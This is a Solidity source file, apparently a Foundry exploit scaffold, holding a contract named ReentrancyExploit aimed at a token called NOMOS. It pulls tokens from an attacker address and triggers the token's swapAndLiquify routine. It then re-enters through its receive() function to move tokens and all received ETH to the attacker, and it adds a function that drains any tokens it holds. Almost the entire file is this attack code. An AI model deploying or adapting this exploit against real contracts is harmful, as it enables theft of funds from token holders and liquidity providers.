pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INOMOS {
    function owner() external view returns (address);
    function marketingAddress() external view returns (address payable);
    function uniswapV2Pair() external view returns (address);
    function swapAndLiquifyEnabled() external view returns (bool);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function _maxTxAmount() external view returns (uint256);
}

contract ReentrancyExploit {
    address public token;
    address public attacker;
    bool private attacking;
    uint256 private reentrancyCount;

    function initialize(address _token, address _attacker) external {
        token = _token;
        attacker = _attacker;
    }

    function startAttack(address pair) external {
        INOMOS tokenContract = INOMOS(token);

        // Transfer tokens to trigger swap
        uint256 attackAmount = 500000 * 10**11; // Enough to accumulate fees
        tokenContract.transferFrom(attacker, address(this), attackAmount);

        // Now transfer to pair to trigger swapAndLiquify
        tokenContract.transfer(pair, attackAmount / 2);
    }

    receive() external payable {
        if (!attacking && msg.value > 0) {
            attacking = true;
            reentrancyCount++;

            // Re-enter the token contract during ETH transfer
            // We can try to transfer more tokens or manipulate state
            if (reentrancyCount < 2) { // Limit reentrancy to avoid out of gas
                INOMOS tokenContract = INOMOS(token);

                // Try to transfer tokens while in the middle of swap
                // This might manipulate balances before fees are fully deducted
                uint256 balance = tokenContract.balanceOf(address(this));
                if (balance > 0) {
                    // Transfer to attacker to extract value
                    tokenContract.transfer(attacker, balance / 2);
                }
            }

            attacking = false;
        }

        // Send received ETH to attacker
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    // Allow attacker to withdraw any stuck tokens
    function withdrawTokens(address tokenAddress) external {
        IERC20(tokenAddress).transfer(attacker, IERC20(tokenAddress).balanceOf(address(this)));
    }
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

